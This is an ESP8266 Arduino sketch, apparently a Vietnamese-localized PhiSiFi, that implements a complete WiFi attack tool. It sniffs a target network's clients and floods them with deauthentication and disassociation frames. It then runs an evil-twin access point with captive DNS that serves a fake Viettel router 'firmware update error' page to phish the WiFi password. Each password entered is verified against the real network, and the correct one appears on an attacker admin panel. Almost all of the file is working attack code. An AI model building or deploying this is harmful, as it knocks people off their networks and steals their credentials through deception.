#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

// ====================================================================================
// =================== FORWARD DECLARATIONS & GLOBAL VARIABLES ========================
// ====================================================================================

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
} _Network;

_Network _networks[16];
_Network _selectedNetwork;  // The single, currently selected network

#define MAX_CLIENTS 20
uint8_t clients[MAX_CLIENTS][6];
int client_count = 0;

bool hotspot_active = false;
bool deauthing_active = false;
String _correct = "";
String _tryPassword = "";

// --- Function Prototypes ---
String bytesToStr(const uint8_t* b, uint32_t size);
void handleAdmin();
void performScan();
String sanitizeSSID(String ssid);

// ====================================================================================
// ============================= DEAUTH & SNIFFER LOGIC ===============================
// ====================================================================================

enum { WIFI_PKT_MGMT = 0,
       WIFI_PKT_CTRL = 1,
       WIFI_PKT_DATA = 2 };
#define SUBTYPE_DISASSOC 0xA0
#define SUBTYPE_DEAUTH 0xC0

typedef struct {
  uint16_t frame_control;
  uint16_t duration;
  uint8_t addr1[6], addr2[6], addr3[6];
  uint16_t seq_ctrl;
} wifi_mgmt_frame_t;

void ICACHE_RAM_ATTR sniffer_callback(uint8_t* buf, uint16_t len) {
  if (len < sizeof(wifi_mgmt_frame_t) || !deauthing_active || _selectedNetwork.ssid == "") return;

  wifi_mgmt_frame_t* frame = (wifi_mgmt_frame_t*)buf;
  bool to_ds = (frame->frame_control & 0x0100) != 0;
  bool from_ds = (frame->frame_control & 0x0200) != 0;

  uint8_t* bssid = nullptr;
  uint8_t* client_mac = nullptr;

  if (to_ds && !from_ds) {
    bssid = frame->addr1;
    client_mac = frame->addr2;
  } else if (!to_ds && from_ds) {
    bssid = frame->addr2;
    client_mac = frame->addr1;
  } else return;

  if (memcmp(bssid, _selectedNetwork.bssid, 6) == 0) {
    for (int j = 0; j < client_count; j++)
      if (memcmp(clients[j], client_mac, 6) == 0) return;
    if (client_count < MAX_CLIENTS) {
      memcpy(clients[client_count], client_mac, 6);
      client_count++;
      Serial.printf("Found client %s for %s\n", bytesToStr(client_mac, 6).c_str(), _selectedNetwork.ssid.c_str());
    }
  }
}

void sendMgmtPacket(const uint8_t* target_mac, const uint8_t* bssid, uint8_t subtype) {
  uint8_t packet[26] = { subtype, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x01, 0x00 };
  memcpy(&packet[4], target_mac, 6);
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
}

// ====================================================================================
// ================================ WEB SERVER & HTML =================================
// ====================================================================================

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void clearNetworks() {
  for (int i = 0; i < 16; i++) _networks[i].ssid = "";
}

// --- VIETNAMESE LOCALIZATION FOR PHISHING PAGE ---
#define SUBTITLE "CHỨC NĂNG KHÔI PHỤC ROUTER"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>⚠</warning> Lỗi Cập Nhật Firmware"
#define BODY "Router của bạn gặp sự cố khi tự động cài đặt bản cập nhật firmware mới nhất.<br><br>Để khôi phục lại firmware cũ và cập nhật thủ công sau, vui lòng xác nhận mật khẩu WiFi của bạn."

String header(String t) {
  String routerName = (_selectedNetwork.ssid == "") ? "Viettel WiFi Router" : "Router " + sanitizeSSID(_selectedNetwork.ssid);
  String CSS = "body{font-family:'Segoe UI',Tahoma,Arial,'Helvetica Neue',Helvetica,sans-serif;line-height:1.6;margin:0;padding:0;background:#f5f5f5;color:#333;font-size:14px}nav{background:linear-gradient(135deg,#e80000,#b00000);color:#fff;padding:1em;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1.2em;font-weight:600;margin-bottom:.5em}.container{max-width:500px;margin:0 auto;padding:20px}.update-card{background:#fff;border-radius:10px;padding:2em;box-shadow:0 2px 8px rgba(0,0,0,.1);margin-top:20px}.warning-icon{font-size:48px;color:#ff9800;text-align:center;margin-bottom:20px}.title{color:#d32f2f;font-size:1.5em;margin:.5em 0;text-align:center;font-weight:600}.input-group{margin:1.5em 0}label{display:block;margin-bottom:8px;color:#666;font-weight:500}input[type=password]{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:16px;transition:border-color .3s;box-sizing:border-box}input[type=password]:focus{border-color:#e80000;outline:0}input[type=submit]{width:100%;background:#e80000;color:#fff;border:none;padding:12px;border-radius:6px;font-size:16px;cursor:pointer;transition:background .3s}input[type=submit]:hover{background:#b00000}.status-text{text-align:center;color:#666;margin-top:10px;font-size:.9em}";
  String h = "<!DOCTYPE html><html lang='vi'><head><title>Cập nhật Firmware - " + routerName + "</title><meta name='viewport' content='width=device-width,initial-scale=1'><meta charset='UTF-8'><style>" + CSS + "</style></head><body><nav><b>" + routerName + "</b>" + SUBTITLE + "</nav><div class='container'>";
  return h;
}

String footer() {
  return "<div class='status-text' style='margin-top:2em;text-align:center;'>© 2025 Viettel Group. Bảo lưu mọi quyền.</div></div></body></html>";
}

String index() {
  return header(TITLE) + "<div class='update-card'><div class='warning-icon'>⚠️</div><div class='title'>" + TITLE + "</div><p>" + BODY + "</p><form action='/' method='post'><div class='input-group'><label for='password'>Mật khẩu WiFi</label><input type='password' id='password' name='password' minlength='8' required placeholder='Nhập mật khẩu WiFi của bạn'></div><input type='submit' value='Xác Nhận & Tiếp Tục'></form><p class='status-text'>Quá trình này có thể mất vài phút.</p></div>" + footer();
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},4000);</script><meta name='viewport' content='initial-scale=1.0,width=device-width'><meta charset='UTF-8'><title>Lỗi Xác Thực</title><style>body{font-family:'Segoe UI',Tahoma,Arial,'Helvetica Neue',Helvetica,sans-serif;background:#f5f5f5;margin:0;padding:20px;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-size:14px}.error-card{background:#fff;padding:2.5em;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:400px;border-left:5px solid #dc3545}h2{color:#dc3545;margin-bottom:20px;font-weight:600}p{color:#666;line-height:1.5;margin:15px 0}.icon{font-size:48px;margin-bottom:15px;display:block}</style></head><body><div class='error-card'><span class='icon'>🚫</span><h2>Mật khẩu không chính xác</h2><p>Mật khẩu WiFi bạn vừa nhập không đúng.<br><br>Hệ thống sẽ tự động quay lại trang trước trong vài giây để bạn thử lại.</p></div></body></html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Đã lấy được mật khẩu cho: " + sanitizeSSID(_selectedNetwork.ssid) + " | Mật khẩu: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("ahihi", "ahihi123");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><title>ESP8266 Control</title><meta name='viewport' content='initial-scale=1.0,width=device-width'><meta charset='UTF-8'><style>body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#222;color:#eee;font-size:14px;margin:0}.content{max-width:800px;margin:auto;padding:10px}h2{text-align:center;color:#00aaff;margin:20px 0}table{width:100%;border-collapse:collapse;table-layout:fixed}th,td{border:1px solid #555;padding:10px 12px;text-align:left;word-wrap:break-word}th{background:#333;font-weight:bold}button{width:100%;padding:10px 15px;border:none;border-radius:4px;cursor:pointer;background:#007bff;color:#fff;font-family:inherit;font-size:14px;box-sizing:border-box}button:hover{background:#0056b3}button:disabled{background:#555;cursor:not-allowed}.selected{background:#28a745!important}.controls{margin-bottom:20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}.scan-btn{background:#ffc107;color:#000}.scan-btn:hover{background:#e0a800}</style></head><body><div class='content'><h2>Bảng Điều Khiển Tấn Công WiFi</h2><div class='controls'><form method='post' action='/admin?action=scan'><button type='submit' class='scan-btn'>Quét Lại</button></form><form method='post' action='/admin?deauth={deauth}'><button type='submit' {disabled}>{deauth_button}</button></form><form method='post' action='/admin?hotspot={hotspot}'><button type='submit' {disabled}>{hotspot_button}</button></form></div><table><thead><tr><th style='width:50%'>Tên Mạng (SSID)</th><th style='width:10%'>Kênh</th><th style='width:20%'>Tín Hiệu</th><th style='width:20%'>Chọn</th></tr></thead><tbody>";

void handleIndex() {
  if (webServer.hasArg("password")) {
    _tryPassword = webServer.arg("password");
    String verificationPage = "<!DOCTYPE html><html lang='vi'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Đang Khôi Phục Firmware</title><style>body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5;color:#333;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;font-size:14px}.card{background:#fff;border-radius:10px;padding:2em;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:400px;width:100%}.title{font-size:1.5em;margin-bottom:1em;color:#333;font-weight:600}.loader{width:50px;height:50px;border:5px solid #f3f3f3;border-radius:50%;border-top:5px solid #e80000;margin:20px auto;animation:spin 1s linear infinite}.status{color:#666;margin-top:15px;font-size:1em;line-height:1.5;height:40px}.warning{color:#ff6b35;font-weight:500;margin-top:10px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style><script>setTimeout(function(){window.location.href='/result'},15000);var statuses=['Đang kết nối đến máy chủ xác thực...','Đang gửi thông tin xác thực...','Xác thực thành công. Bắt đầu tải firmware...','Đang khôi phục hệ thống...','Hoàn tất. Sắp khởi động lại router...'];var i=0;function updateStatus(){var s=document.getElementById('status');if(s)s.innerHTML=statuses[i];i++;if(i>=statuses.length)i=0}setInterval(updateStatus,3000);</script></head><body><div class='card'><div class='title'>🔄 Đang Khôi Phục Firmware</div><div class='loader'></div><div id='status' class='status'>Đang kết nối đến máy chủ xác thực...</div><div class='warning'>⚠ Vui lòng không ngắt nguồn điện router trong quá trình này</div></div></body></html>";
    webServer.send(200, "text/html", verificationPage);
    deauthing_active = false;
    WiFi.disconnect();
    WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
  } else {
    if (hotspot_active) webServer.send(200, "text/html", index());
    else handleAdmin();
  }
}

void handleAdmin() {
  if (webServer.hasArg("action") && webServer.arg("action") == "scan") {
    performScan();
    webServer.sendHeader("Location", "/admin", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  if (webServer.hasArg("ap")) {
    String ap_bssid = webServer.arg("ap");
    if (bytesToStr(_selectedNetwork.bssid, 6) == ap_bssid) {
      _selectedNetwork.ssid = "";
    } else {
      for (int i = 0; i < 16; i++) {
        if (_networks[i].ssid != "" && bytesToStr(_networks[i].bssid, 6) == ap_bssid) {
          _selectedNetwork = _networks[i];
          client_count = 0;
          Serial.printf("Network selected: %s\n", sanitizeSSID(_selectedNetwork.ssid).c_str());
          break;
        }
      }
    }
  }
  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") deauthing_active = true;
    else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      client_count = 0;
    }
    webServer.sendHeader("Location", "/admin", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("ahihi", "ahihi123");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    webServer.sendHeader("Location", "/admin", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String _html = _tempHTML;
  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") break;
    bool isSelected = (_selectedNetwork.ssid != "" && memcmp(_selectedNetwork.bssid, _networks[i].bssid, 6) == 0);
    _html += "<tr><td>" + sanitizeSSID(_networks[i].ssid) + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(_networks[i].rssi) + " dBm</td><td>";
    _html += "<form method='post' action='/admin?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button type='submit' class='" + (isSelected ? "selected" : "") + "'>" + (isSelected ? "Đã Chọn" : "Chọn") + "</button></form></td></tr>";
  }
  _html += "</tbody></table>";
  if (deauthing_active) {
    _html.replace("{deauth_button}", "Dừng Deauth");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Bắt Đầu Deauth");
    _html.replace("{deauth}", "start");
  }
  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Dừng EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Bắt Đầu EvilTwin");
    _html.replace("{hotspot}", "start");
  }
  if (_selectedNetwork.ssid == "") _html.replace("{disabled}", " disabled");
  else _html.replace("{disabled}", "");
  if (_correct != "") _html += "<br><h3 style='text-align:center;color:#28a745;'>" + _correct + "</h3>";
  if (client_count > 0) {
    _html += "<h3>Các Client Bị Phát Hiện (" + String(client_count) + ")</h3><ul>";
    for (int i = 0; i < client_count; i++) _html += "<li>" + bytesToStr(clients[i], 6) + "</li>";
    _html += "</ul>";
  }
  _html += "</div></body></html>";
  webServer.send(200, "text/html", _html);
}

// ====================================================================================
// ============================= SETUP & LOOP FUNCTIONS ===============================
// ====================================================================================

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("ESP8266 PhiSiFi Starting...");
  WiFi.mode(WIFI_AP_STA);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("ahihi", "ahihi123");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  performScan();
  Serial.println("Setup complete. Access admin panel at http://192.168.4.1/admin");
}

void performScan() {
  Serial.println("Scanning for networks...");
  uint8_t selected_bssid[6];
  bool selection_exists = (_selectedNetwork.ssid != "");
  if (selection_exists) memcpy(selected_bssid, _selectedNetwork.bssid, 6);

  clearNetworks();
  int n = WiFi.scanNetworks(false, true);
  if (n > 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      if (selection_exists && memcmp(_networks[i].bssid, selected_bssid, 6) == 0) {
        _selectedNetwork = _networks[i];
      }
    }
  } else Serial.println("No networks found.");
  for (int i = 0; i < n - 1; i++) {
    for (int j = 0; j < n - i - 1; j++) {
      if (_networks[j].rssi < _networks[j + 1].rssi) {
        _Network temp = _networks[j];
        _networks[j] = _networks[j + 1];
        _networks[j + 1] = temp;
      }
    }
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  str.toUpperCase();
  return str;
}

String sanitizeSSID(String ssid) {
  String sanitized = "";
  for (unsigned int i = 0; i < ssid.length(); i++) {
    char c = ssid.charAt(i);
    if (c < 32 || c > 126) {
    } else sanitized += c;
  }
  if (sanitized.length() == 0) return "[Mạng Ẩn]";
  return sanitized;
}

const uint8_t broadcast_mac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active && _selectedNetwork.ssid != "") {
    wifi_promiscuous_enable(1);
    wifi_set_channel(_selectedNetwork.ch);
    // Intense burst on the single selected network
    for (int k = 0; k < 30; k++) {
      sendMgmtPacket(broadcast_mac, _selectedNetwork.bssid, SUBTYPE_DEAUTH);
      sendMgmtPacket(broadcast_mac, _selectedNetwork.bssid, SUBTYPE_DISASSOC);
    }
    for (int j = 0; j < client_count; j++) {
      for (int k = 0; k < 15; k++) {
        sendMgmtPacket(clients[j], _selectedNetwork.bssid, SUBTYPE_DEAUTH);
        sendMgmtPacket(clients[j], _selectedNetwork.bssid, SUBTYPE_DISASSOC);
      }
    }
    delay(10);
  } else {
    wifi_promiscuous_enable(0);
  }
}